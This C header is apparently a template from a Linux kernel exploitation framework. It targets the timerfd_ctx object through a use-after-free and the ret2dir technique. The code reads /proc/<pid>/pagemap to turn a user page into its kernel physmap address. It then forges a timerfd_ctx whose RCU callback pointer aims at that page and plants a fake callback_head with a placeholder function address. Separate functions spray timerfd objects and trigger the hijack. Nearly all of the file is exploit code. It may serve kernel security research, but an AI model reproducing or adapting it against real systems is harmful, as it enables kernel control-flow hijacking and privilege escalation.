#ifndef _TIMERFD_CTX_TMPL_H_
#define _TIMERFD_CTX_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define KMALLOC_SIZE 256

#define RCU_OBJ

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

struct timerfd_ctx {
    char hole1[0xb0];
	void* callback_next;
    char hole2[0x20];
};

struct callback_head {
	void* callback_next;
	void* callback_func;
};

struct timerfd_ctx fake_timerfd_ctx;
struct callback_head fake_callback_head;

unsigned overwrite_start = 0xb0;
unsigned overwrite_end = 0xb8;

void* victim_obj = (void*)&fake_timerfd_ctx;

int fd[64];
uint64_t kaddr = 0;

void do_setup_physmap() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		memset(&fake_timerfd_ctx, 0x00, sizeof(struct timerfd_ctx));
		fake_timerfd_ctx.callback_next= (void*)kaddr;
		fake_callback_head.callback_next = 0;
		fake_callback_head.callback_func = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
		memcpy((void*)USER_ADDR, &fake_callback_head, sizeof(struct callback_head));
    }
	return;
err:
	close(fd);
	exit(-1);
}

uint64_t r[2] = {0xffffffffffffffff, 0xffffffffffffffff};

void do_alloc_victim() {
  long res = 0;
  res = syscall(__NR_timerfd_create, 1, 0x800);
  if (res != -1)
    r[1] = res;
  return ;
}

void do_hijack() {
 	syscall(__NR_exit, 0x46);
	return ;
}

#endif
